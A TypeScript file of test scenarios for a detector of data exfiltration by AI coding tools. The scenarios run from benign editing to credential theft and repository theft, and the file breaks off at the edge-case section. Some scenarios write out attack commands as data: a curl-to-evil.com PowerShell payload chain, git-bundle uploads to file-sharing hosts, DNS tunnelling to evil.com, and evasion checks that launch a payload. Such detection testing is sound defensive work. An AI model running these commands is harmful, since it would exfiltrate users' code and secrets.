'use strict';

import { ValidationScenario, generateScenarioId } from './types';

const SID = generateScenarioId;

const flow = (
  overrides: Partial<import('./types').NetworkFlow>
): import('./types').ScenarioEvent => ({
  type: 'flow',
  data: {
    id: `f-${Math.random().toString(36).substring(2, 8)}`,
    sessionId: '',
    timestamp: new Date(),
    protocol: 'TCP',
    sourceAddr: '127.0.0.1',
    sourcePort: 50000,
    destAddr: '8.8.8.8',
    destPort: 443,
    bytesSent: 1000,
    bytesReceived: 500,
    durationMs: 100,
    ...overrides,
  },
});

const processEv = (
  overrides: Partial<import('./types').ProcessEvent>
): import('./types').ScenarioEvent => ({
  type: 'process',
  data: {
    pid: Math.floor(Math.random() * 9000) + 1000,
    name: 'process.exe',
    commandLine: 'process.exe',
    timestamp: new Date(),
    riskIndicators: [],
    ...overrides,
  },
});

const fileAccess = (
  overrides: Partial<import('./types').FileAccessEvent>
): import('./types').ScenarioEvent => ({
  type: 'file_access',
  data: {
    filePath: 'C:\\file.txt',
    processName: 'explorer.exe',
    pid: 4000,
    operation: 'read',
    timestamp: new Date(),
    ...overrides,
  },
});

const gitCmd = (
  overrides: Partial<import('./types').GitCommandEvent>
): import('./types').ScenarioEvent => ({
  type: 'git_command',
  data: {
    pid: 5000,
    processName: 'git.exe',
    commandLine: 'git status',
    action: 'other',
    timestamp: new Date(),
    ...overrides,
  },
});

export const SCENARIOS: ValidationScenario[] = [
  // ── LOW ──────────────────────────────────────────────────────
  {
    id: SID(), name: 'benign_readme_only',
    description: 'Developer reads README.md and LICENSE — no suspicious activity',
    tags: ['benign', 'low', 'baseline'],
    severity: 'LOW',
    events: [
      fileAccess({ filePath: 'C:\\project\\README.md', bytesRead: 2048 }),
      fileAccess({ filePath: 'C:\\project\\LICENSE', bytesRead: 1024 }),
      flow({ hostname: 'api.github.com', destAddr: '140.82.121.5', bytesSent: 500, bytesReceived: 2000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['mass_file_read', 'secrets_scanned', 'git_history_read'] },
  },
  {
    id: SID(), name: 'benign_npm_install',
    description: 'npm install with normal traffic',
    tags: ['benign', 'low', 'npm'],
    severity: 'LOW',
    events: [
      processEv({ name: 'node.exe', commandLine: 'npm install express' }),
      flow({ protocol: 'HTTP', hostname: 'registry.npmjs.org', destAddr: '104.16.24.35', destPort: 443, bytesSent: 3000, bytesReceived: 150000 }),
      processEv({ name: 'node.exe', commandLine: 'node node_modules/.bin/express' }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['secrets_exfiltrated', 'code_upload', 'suspicious_connection'] },
  },
  {
    id: SID(), name: 'benign_vscode_edit',
    description: 'VSCode normal editing — open, type, save',
    tags: ['benign', 'low', 'editor'],
    severity: 'LOW',
    events: [
      fileAccess({ filePath: 'C:\\project\\src\\index.ts', processName: 'Code.exe', operation: 'open', bytesRead: 5000 }),
      fileAccess({ filePath: 'C:\\project\\src\\index.ts', processName: 'Code.exe', operation: 'write' }),
      processEv({ name: 'tsc.exe', commandLine: 'npx tsc --noEmit', pid: 6000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 25, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['mass_file_read', 'full_repo_snapshot', 'git_bundle_created'] },
  },
  {
    id: SID(), name: 'benign_web_browsing',
    description: 'Normal web browsing — documentation sites',
    tags: ['benign', 'low', 'web'],
    severity: 'LOW',
    events: [
      flow({ hostname: 'developer.mozilla.org', destAddr: '104.16.25.10', destPort: 443, bytesSent: 2000, bytesReceived: 50000 }),
      flow({ hostname: 'stackoverflow.com', destAddr: '151.101.1.69', destPort: 443, bytesSent: 1500, bytesReceived: 30000 }),
      flow({ hostname: 'www.typescriptlang.org', destAddr: '185.199.111.153', destPort: 443, bytesSent: 1000, bytesReceived: 20000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 20, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['suspicious_connection', 'ai_prompt_sent', 'code_upload'] },
  },
  {
    id: SID(), name: 'benign_cursor_question',
    description: 'Cursor IDE — user asks about a function, reads a few files',
    tags: ['benign', 'low', 'cursor'],
    severity: 'LOW',
    events: [
      processEv({ name: 'Cursor.exe', commandLine: 'Cursor.exe', riskIndicators: [] }),
      fileAccess({ filePath: 'C:\\project\\src\\utils.ts', processName: 'Cursor.exe', operation: 'read', bytesRead: 8000 }),
      fileAccess({ filePath: 'C:\\project\\src\\types.ts', processName: 'Cursor.exe', operation: 'read', bytesRead: 3000 }),
      flow({ hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, bytesSent: 2000, bytesReceived: 5000 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 15, riskScoreMax: 35, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['full_repo_snapshot', 'git_bundle_created', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'benign_git_pull',
    description: 'Normal git pull from remote repository',
    tags: ['benign', 'low', 'git'],
    severity: 'LOW',
    events: [
      gitCmd({ action: 'fetch', commandLine: 'git pull origin main', repository: 'github.com/user/project' }),
      flow({ hostname: 'github.com', destAddr: '140.82.121.4', destPort: 22, bytesSent: 10000, bytesReceived: 500000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 0, riskScoreMax: 25, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['git_bundle_created', 'git_history_read', 'full_repo_snapshot'] },
  },

  // ── MEDIUM ────────────────────────────────────────────────────
  {
    id: SID(), name: 'git_history_read',
    description: 'Developer reads git history — checking blame/log',
    tags: ['medium', 'git', 'history'],
    severity: 'MEDIUM',
    events: [
      gitCmd({ action: 'log', commandLine: 'git log --oneline -50', repository: 'github.com/user/project' }),
      gitCmd({ action: 'rev-list', commandLine: 'git rev-list --all --count' }),
      fileAccess({ filePath: 'C:\\project\\.git\\logs\\HEAD', operation: 'read', bytesRead: 200000 }),
      fileAccess({ filePath: 'C:\\project\\.git\\objects\\pack\\pack-abc123.pack', operation: 'read', bytesRead: 5000000 }),
    ],
    expected: { riskLevel: 'HIGH', riskScoreMin: 50, riskScoreMax: 85, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['git_history_read', 'git_objects_read'], mustNotHaveBehaviors: ['git_bundle_uploaded', 'full_repo_snapshot', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'mass_file_read_without_exfil',
    description: 'Tool indexes many files locally (e.g. linter, type checker) — threshold requires 100+ reads',
    tags: ['medium', 'files', 'indexing'],
    severity: 'MEDIUM',
    events: [
      // 120 events to exceed the deliberate threshold of 100 in computeMassReadBehavior
      ...Array.from({ length: 120 }, (_, i) =>
        fileAccess({ filePath: `C:\\project\\src\\file${i}.ts`, processName: 'node.exe', operation: 'read', bytesRead: 5000 })
      ),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 25, riskScoreMax: 50, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['mass_file_read'], mustNotHaveBehaviors: ['full_repo_snapshot', 'git_bundle_created'] },
  },
  {
    id: SID(), name: 'secrets_scanned_local',
    description: 'Secret scanned but not exfiltrated — local only',
    tags: ['medium', 'secrets'],
    severity: 'MEDIUM',
    events: [
      fileAccess({ filePath: 'C:\\project\\.env', processName: 'npx.exe', operation: 'read', bytesRead: 500 }),
      fileAccess({ filePath: 'C:\\project\\src\\config.ts', processName: 'npx.exe', operation: 'read', bytesRead: 2000 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 15, riskScoreMax: 45, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['secrets_scanned'], mustNotHaveBehaviors: ['secrets_exfiltrated', 'code_upload'] },
  },
  {
    id: SID(), name: 'env_file_read',
    description: '.env file read — potential credential access',
    tags: ['medium', 'secrets', 'env'],
    severity: 'MEDIUM',
    events: [
      fileAccess({ filePath: 'C:\\project\\.env', processName: 'Cursor.exe', operation: 'read', bytesRead: 300 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 15, riskScoreMax: 45, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['secrets_scanned'], mustNotHaveBehaviors: ['secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'suspicious_dns_query',
    description: 'DNS query to a known C2-like domain pattern',
    tags: ['medium', 'dns', 'suspicious'],
    severity: 'MEDIUM',
    events: [
      flow({ protocol: 'DNS', hostname: 'dns.google', destAddr: '8.8.8.8', destPort: 53, dnsQuery: 'malware-c2.example.com', bytesSent: 100, bytesReceived: 80 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', destAddr: '8.8.8.8', destPort: 53, dnsQuery: 'exfil-data.storage.googleapis.com', bytesSent: 100, bytesReceived: 80 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 10, riskScoreMax: 30, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['dns_suspicious'], mustNotHaveBehaviors: ['suspicious_connection', 'code_upload'] },
  },
  {
    id: SID(), name: 'multiple_ai_requests',
    description: 'Multiple AI API requests without file context — small payloads produce suspicious_connection (LOW risk)',
    tags: ['medium', 'ai', 'api'],
    severity: 'MEDIUM',
    events: [
      flow({ hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, bytesSent: 5000, bytesReceived: 50000 }),
      flow({ hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, bytesSent: 3000, bytesReceived: 20000 }),
      flow({ hostname: 'api.anthropic.com', destAddr: '104.16.127.30', destPort: 443, bytesSent: 4000, bytesReceived: 30000 }),
    ],
    expected: { riskLevel: 'LOW', riskScoreMin: 10, riskScoreMax: 30, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: [], mustNotHaveBehaviors: ['full_repo_snapshot', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'decoy_file_read',
    description: 'Canary/decoy file was read — possible reconnaissance',
    tags: ['medium', 'canary', 'decoy'],
    severity: 'MEDIUM',
    events: [
      fileAccess({ filePath: 'C:\\project\\passwords.txt', processName: 'explorer.exe', operation: 'read', bytesRead: 1000 }),
      fileAccess({ filePath: 'C:\\project\\.env.prod', processName: 'explorer.exe', operation: 'read', bytesRead: 500 }),
    ],
    expected: { riskLevel: 'HIGH', riskScoreMin: 50, riskScoreMax: 80, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['canary_read'], mustNotHaveBehaviors: ['canary_exfiltrated'] },
  },

  // ── HIGH ──────────────────────────────────────────────────────
  {
    id: SID(), name: 'git_bundle_prepare',
    description: 'Git bundle created locally — preparing for exfiltration',
    tags: ['high', 'git', 'bundle'],
    severity: 'HIGH',
    events: [
      gitCmd({ action: 'bundle', commandLine: 'git bundle create repo.bundle --all', repository: 'github.com/user/project' }),
      fileAccess({ filePath: 'C:\\project\\.git\\objects\\pack\\pack-def456.pack', operation: 'read', bytesRead: 10000000 }),
      fileAccess({ filePath: 'C:\\project\\repo.bundle', operation: 'write' }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['git_bundle_created', 'full_repo_snapshot'], mustNotHaveBehaviors: ['git_bundle_uploaded', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'env_exfil_attempt',
    description: '.env read then HTTP POST — credential exfiltration attempt',
    tags: ['high', 'secrets', 'exfil'],
    severity: 'HIGH',
    events: [
      fileAccess({ filePath: 'C:\\project\\.env', operation: 'read', bytesRead: 500 }),
      fileAccess({ filePath: 'C:\\project\\secrets.json', operation: 'read', bytesRead: 2000 }),
      flow({ protocol: 'HTTP', hostname: 'pastebin.com', destAddr: '104.20.15.30', destPort: 443, bytesSent: 50000, bytesReceived: 200, method: 'POST', path: '/api/upload' }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['secrets_scanned', 'suspicious_connection'], mustNotHaveBehaviors: ['canary_exfiltrated'] },
  },
  {
    id: SID(), name: 'full_repo_indexing',
    description: 'AI tool reads thousands of files — full repository indexing for context',
    tags: ['high', 'files', 'indexing'],
    severity: 'HIGH',
    events: [
      ...Array.from({ length: 200 }, (_, i) =>
        fileAccess({ filePath: `C:\\project\\src\\file${i}.ts`, processName: 'Cursor.exe', operation: 'read', bytesRead: 8000 })
      ),
      fileAccess({ filePath: 'C:\\project\\.git\\index', processName: 'Cursor.exe', operation: 'read', bytesRead: 100000 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['mass_file_read', 'full_repo_snapshot'], mustNotHaveBehaviors: ['git_bundle_uploaded', 'secrets_exfiltrated'] },
  },
  {
    id: SID(), name: 'preparation_then_connection',
    description: 'Preparation commands (whoami, ipconfig) then outbound connection',
    tags: ['high', 'preparation', 'recon'],
    severity: 'HIGH',
    events: [
      processEv({ name: 'cmd.exe', commandLine: 'whoami', riskIndicators: ['recon'] }),
      processEv({ name: 'cmd.exe', commandLine: 'ipconfig /all', riskIndicators: ['recon'] }),
      processEv({ name: 'cmd.exe', commandLine: 'netstat -an', riskIndicators: ['recon'] }),
      flow({ hostname: '185.234.72.18', destAddr: '185.234.72.18', destPort: 443, bytesSent: 30000, bytesReceived: 1000 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 30, riskScoreMax: 60, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['preparation_detected', 'suspicious_connection'], mustNotHaveBehaviors: ['git_bundle_uploaded'] },
  },
  {
    id: SID(), name: 'code_upload_to_external',
    description: 'Significant code upload to external service',
    tags: ['high', 'code', 'upload'],
    severity: 'HIGH',
    events: [
      fileAccess({ filePath: 'C:\\project\\src\\app.js', operation: 'read', bytesRead: 50000 }),
      fileAccess({ filePath: 'C:\\project\\src\\utils.js', operation: 'read', bytesRead: 30000 }),
      // Increased payload to 2MB to exceed code_upload threshold
      flow({ protocol: 'HTTP', hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, method: 'POST', path: '/v1/chat/completions', bytesSent: 2000000, bytesReceived: 50000, contentType: 'application/json' }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 35, riskScoreMax: 65, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['code_upload', 'ai_prompt_sent'], mustNotHaveBehaviors: ['secrets_exfiltrated', 'git_bundle_uploaded'] },
  },
  {
    id: SID(), name: 'process_chain_detected',
    description: 'Suspicious process chain — curl | powershell | python',
    tags: ['high', 'process', 'chain'],
    severity: 'HIGH',
    events: [
      processEv({ name: 'Cursor.exe', commandLine: 'Cursor.exe', pid: 500, parentPid: 100, parentName: 'explorer.exe' }),
      processEv({ name: 'curl.exe', commandLine: 'curl http://evil.com/payload.ps1 -o payload.ps1', pid: 1000, parentPid: 500, parentName: 'Cursor.exe', riskIndicators: ['download'] }),
      processEv({ name: 'powershell.exe', commandLine: 'powershell -ExecutionPolicy Bypass -File payload.ps1', pid: 1001, parentPid: 1000, parentName: 'curl.exe', riskIndicators: ['execution'] }),
      processEv({ name: 'python.exe', commandLine: 'python -c "import os; os.system(\'git bundle create out.bundle --all\')"', pid: 1002, parentPid: 1001, parentName: 'powershell.exe', riskIndicators: ['git', 'exfil'] }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['process_chain_detected'], mustNotHaveBehaviors: ['canary_exfiltrated'] },
  },
  {
    id: SID(), name: 'fake_secret_read_by_ai',
    description: 'AI agent reads fake secret file',
    tags: ['high', 'canary', 'secret'],
    severity: 'HIGH',
    events: [
      fileAccess({ filePath: 'C:\\project\\src\\aws-keys.json', processName: 'Cursor.exe', operation: 'read', bytesRead: 400 }),
      fileAccess({ filePath: 'C:\\project\\src\\config\\database.sql', processName: 'Cursor.exe', operation: 'read', bytesRead: 2000 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['fake_secret_read'], mustNotHaveBehaviors: ['secrets_exfiltrated', 'canary_exfiltrated'] },
  },

  // ── CRITICAL ──────────────────────────────────────────────────
  {
    id: SID(), name: 'git_bundle_uploaded',
    description: 'Full git bundle created AND uploaded — confirmed exfiltration',
    tags: ['critical', 'git', 'exfil'],
    severity: 'CRITICAL',
    events: [
      gitCmd({ action: 'bundle', commandLine: 'git bundle create full-repo.bundle --all', repository: 'github.com/user/project' }),
      flow({ protocol: 'HTTP', hostname: 'file.io', destAddr: '45.33.32.156', destPort: 443, method: 'POST', path: '/upload', bytesSent: 50000000, bytesReceived: 500 }),
      fileAccess({ filePath: 'C:\\project\\full-repo.bundle', operation: 'read', bytesRead: 50000000 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['git_bundle_created', 'git_bundle_uploaded', 'full_repo_snapshot'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'secrets_exfiltrated',
    description: 'Secrets read and uploaded — confirmed credential theft',
    tags: ['critical', 'secrets', 'exfil'],
    severity: 'CRITICAL',
    events: [
      fileAccess({ filePath: 'C:\\project\\.env', operation: 'read', bytesRead: 500 }),
      fileAccess({ filePath: 'C:\\project\\secrets\\prod.json', operation: 'read', bytesRead: 5000 }),
      flow({ protocol: 'HTTP', hostname: 'gist.githubusercontent.com', destAddr: '140.82.121.6', destPort: 443, method: 'POST', path: '/gists', bytesSent: 20000, bytesReceived: 500 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 75, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['secrets_scanned', 'secrets_exfiltrated'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'canary_exfiltrated',
    description: 'Decoy file read and uploaded — canary triggered',
    tags: ['critical', 'canary', 'exfil'],
    severity: 'CRITICAL',
    events: [
      fileAccess({ filePath: 'C:\\project\\passwords.txt', processName: 'explorer.exe', operation: 'read', bytesRead: 1000 }),
      fileAccess({ filePath: 'C:\\project\\ssh-private.key', processName: 'explorer.exe', operation: 'read', bytesRead: 2000 }),
      flow({ protocol: 'HTTP', hostname: 'transfer.sh', destAddr: '54.36.110.20', destPort: 443, method: 'POST', path: '/upload', bytesSent: 100000, bytesReceived: 300 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['canary_read', 'canary_exfiltrated'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'full_repo_exfil_over_https',
    description: 'Complete repository snapshot uploaded over HTTPS',
    tags: ['critical', 'repo', 'exfil'],
    severity: 'CRITICAL',
    events: [
      ...Array.from({ length: 500 }, (_, i) =>
        fileAccess({ filePath: `C:\\project\\src\\file${i}.ts`, operation: 'read', bytesRead: 5000 })
      ),
      fileAccess({ filePath: 'C:\\project\\.git\\index', operation: 'read', bytesRead: 200000 }),
      flow({ protocol: 'HTTP', hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, method: 'POST', path: '/v1/chat/completions', bytesSent: 50000000, bytesReceived: 10000, contentType: 'application/json' }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['full_repo_snapshot', 'mass_file_read', 'code_upload', 'ai_prompt_sent'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'targeted_snapshot_with_embedding',
    description: 'Targeted file read + embedding generation + upload — AI data theft',
    tags: ['critical', 'embedding', 'exfil'],
    severity: 'CRITICAL',
    events: [
      // 210 files read regularly to trigger computeEmbeddingBehavior (threshold 200)
      ...Array.from({ length: 210 }, (_, i) => ({
        type: 'file_access' as const,
        data: {
          filePath: `C:\\project\\src\\file${i}.ts`,
          processName: 'Cursor.exe',
          pid: 4000,
          operation: 'read' as const,
          timestamp: new Date(2024, 0, 1, 10, 0, 0, i * 10), // exactly 10ms apart
          bytesRead: 2048,
        },
      })),
      flow({ protocol: 'HTTP', hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, method: 'POST', path: '/v1/embeddings', bytesSent: 100000, bytesReceived: 50000, contentType: 'application/json' }),
      // Increased payload to 1.5MB to exceed the 1MB code_upload threshold for known AI hosts
      flow({ protocol: 'HTTP', hostname: 'api.openai.com', destAddr: '104.18.20.45', destPort: 443, method: 'POST', path: '/v1/chat/completions', bytesSent: 1500000, bytesReceived: 20000, contentType: 'application/json' }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['embeddings_generated', 'ai_prompt_sent', 'code_upload'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'anti_evasion_fragmented_exfil',
    description: 'Fragmented traffic + protocol hopping + distributed chain — sophisticated exfil',
    tags: ['critical', 'evasion', 'exfil'],
    severity: 'CRITICAL',
    events: [
      fileAccess({ filePath: 'C:\\project\\.git\\objects\\pack\\pack-ghi789.pack', operation: 'read', bytesRead: 20000000 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', dnsQuery: 'exfil.chunk1.evil.com', bytesSent: 100, bytesReceived: 60 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', dnsQuery: 'exfil.chunk2.evil.com', bytesSent: 100, bytesReceived: 60 }),
      flow({ hostname: '45.33.22.11', destAddr: '45.33.22.11', destPort: 443, bytesSent: 1000000, bytesReceived: 500 }),
      flow({ hostname: '23.21.45.67', destAddr: '23.21.45.67', destPort: 53, protocol: 'DNS', dnsQuery: 'exfil.chunk3.evil.com', bytesSent: 100, bytesReceived: 60 }),
      flow({ hostname: '54.12.78.90', destAddr: '54.12.78.90', destPort: 80, protocol: 'TCP', bytesSent: 500000, bytesReceived: 200 }),
      // Adding a 6th network flow to trigger protocol_hopping (which maps to anti_evasion_detected)
      flow({ hostname: 'dns.google', destAddr: '8.8.8.8', destPort: 53, protocol: 'DNS', dnsQuery: 'exfil.chunk4.evil.com', bytesSent: 100, bytesReceived: 60 }),
      processEv({ name: 'tar.exe', commandLine: 'tar czf payload.tar.gz .git', riskIndicators: ['compression', 'archive'] }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['anti_evasion_detected', 'full_repo_snapshot'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'contaminated_git_access',
    description: 'Contaminated git history accessed — canary in git',
    tags: ['critical', 'canary', 'git'],
    severity: 'CRITICAL',
    events: [
      gitCmd({ action: 'log', commandLine: 'git log --all -p', repository: 'github.com/user/project' }),
      gitCmd({ action: 'bundle', commandLine: 'git bundle create leaked.bundle --all' }),
      flow({ protocol: 'HTTP', hostname: 'transfer.sh', destAddr: '54.36.110.20', destPort: 443, method: 'POST', path: '/leaked.bundle', bytesSent: 40000000, bytesReceived: 400 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['contaminated_git_read', 'git_bundle_created', 'git_bundle_uploaded'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'preparation_chain_full_exfil',
    description: 'Full kill chain: recon → snapshot → bundle → exfil',
    tags: ['critical', 'chain', 'exfil'],
    severity: 'CRITICAL',
    events: [
      processEv({ name: 'cmd.exe', commandLine: 'whoami', riskIndicators: ['recon'] }),
      processEv({ name: 'cmd.exe', commandLine: 'dir /s C:\\project', riskIndicators: ['recon'] }),
      fileAccess({ filePath: 'C:\\project\\.git\\objects\\pack\\pack-jkl012.pack', operation: 'read', bytesRead: 30000000 }),
      gitCmd({ action: 'bundle', commandLine: 'git bundle create full.bundle --all', repository: 'github.com/user/project' }),
      flow({ protocol: 'HTTP', hostname: 'mega.nz', destAddr: '154.53.45.12', destPort: 443, method: 'POST', path: '/upload', bytesSent: 60000000, bytesReceived: 1000 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['preparation_detected', 'full_repo_snapshot', 'git_bundle_created', 'git_bundle_uploaded'], mustNotHaveBehaviors: [] },
  },

  // ── ANTI-EVASION VARIANTS ────────────────────────────────────
  {
    id: SID(), name: 'artificial_rhythm_detected',
    description: 'File reads with perfectly uniform intervals — machine-generated timings (detectArtificialRhythm operates on file events)',
    tags: ['evasion', 'timing'],
    severity: 'HIGH',
    events: [
      // 25 file reads with perfectly uniform 100ms intervals — CV will be near 0
      ...Array.from({ length: 25 }, (_, i) => ({
        type: 'file_access' as const,
        data: {
          filePath: `C:\\project\\src\\file${i}.ts`,
          processName: 'bot.exe',
          pid: 9000,
          operation: 'read' as const,
          timestamp: new Date(2024, 0, 1, 10, 0, 0, i * 100), // exactly 100ms apart
          bytesRead: 5000,
        },
      })),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 35, riskScoreMax: 65, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['anti_evasion_detected'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'protocol_hopping_evasion',
    description: 'Protocol hopping: TCP → DNS → TCP — common evasion pattern',
    tags: ['evasion', 'protocol'],
    severity: 'HIGH',
    events: [
      flow({ protocol: 'TCP', hostname: '45.33.22.11', destPort: 443, bytesSent: 5000, bytesReceived: 200 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', dnsQuery: 'chunk1.evil.com', bytesSent: 100, bytesReceived: 60 }),
      flow({ protocol: 'TCP', hostname: '23.21.45.67', destPort: 993, bytesSent: 3000, bytesReceived: 150 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', dnsQuery: 'chunk2.evil.com', bytesSent: 100, bytesReceived: 60 }),
      flow({ protocol: 'TCP', hostname: '54.12.78.90', destPort: 22, bytesSent: 7000, bytesReceived: 300 }),
      flow({ protocol: 'DNS', hostname: 'dns.google', dnsQuery: 'chunk3.evil.com', bytesSent: 100, bytesReceived: 60 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 35, riskScoreMax: 65, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['anti_evasion_detected'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'monitor_awareness_behavior',
    description: 'Process checks for debuggers, VM, or monitoring tools',
    tags: ['evasion', 'monitor'],
    severity: 'HIGH',
    events: [
      processEv({ name: 'powershell.exe', commandLine: 'Get-Process -Name procexp, wireshark, tcpview', riskIndicators: ['monitor_detection'] }),
      processEv({ name: 'powershell.exe', commandLine: 'Test-Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\QualityCompat', riskIndicators: ['monitor_detection'] }),
      processEv({ name: 'powershell.exe', commandLine: 'if (-not (Get-Process -Name sentinel)) { ./payload.exe }', riskIndicators: ['conditional_execution', 'monitor_detection'] }),
    ],
    expected: { riskLevel: 'HIGH', riskScoreMin: 45, riskScoreMax: 75, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['monitor_awareness_detected'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'memory_only_ops',
    description: 'Process executes with no temp files — memory-only payload (anti-evasion detects the file read pattern)',
    tags: ['evasion', 'memory'],
    severity: 'HIGH',
    events: [
      // 55+ reads with zero writes activates detectMemoryOnlyOps (threshold: 50 reads, ratio > 20)
      ...Array.from({ length: 55 }, (_, i) =>
        fileAccess({ filePath: `C:\\project\\src\\sensitive${i}.ts`, processName: 'powershell.exe', operation: 'read', bytesRead: 5000 })
      ),
      flow({ hostname: 'evil.com', destAddr: '185.234.72.18', destPort: 443, bytesSent: 2000, bytesReceived: 50000 }),
    ],
    expected: { riskLevel: 'MEDIUM', riskScoreMin: 20, riskScoreMax: 50, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['anti_evasion_detected'], mustNotHaveBehaviors: [] },
  },
  {
    id: SID(), name: 'distributed_chain_exfil',
    description: 'Data exfiltrated through multiple intermediate hosts',
    tags: ['evasion', 'distributed'],
    severity: 'CRITICAL',
    events: [
      fileAccess({ filePath: 'C:\\project\\.git\\objects\\pack\\pack-mno345.pack', operation: 'read', bytesRead: 25000000 }),
      flow({ hostname: 'proxy1.evil.com', destAddr: '45.33.22.11', destPort: 8080, bytesSent: 10000000, bytesReceived: 500 }),
      flow({ hostname: 'proxy2.evil.com', destAddr: '23.21.45.67', destPort: 3128, bytesSent: 10000000, bytesReceived: 500 }),
      flow({ hostname: 'proxy3.evil.com', destAddr: '54.12.78.90', destPort: 80, bytesSent: 10000000, bytesReceived: 500 }),
    ],
    expected: { riskLevel: 'CRITICAL', riskScoreMin: 80, riskScoreMax: 100, confidenceMin: 0, coverageMin: 0, mustHaveBehaviors: ['anti_evasion_detected', 'full_repo_snapshot'], mustNotHaveBehaviors: [] },
  },

  // ── BORDERLINE / EDGE CASES ──────────────────────────────────
  {
    id: SID(), name: 'large_file_benign',
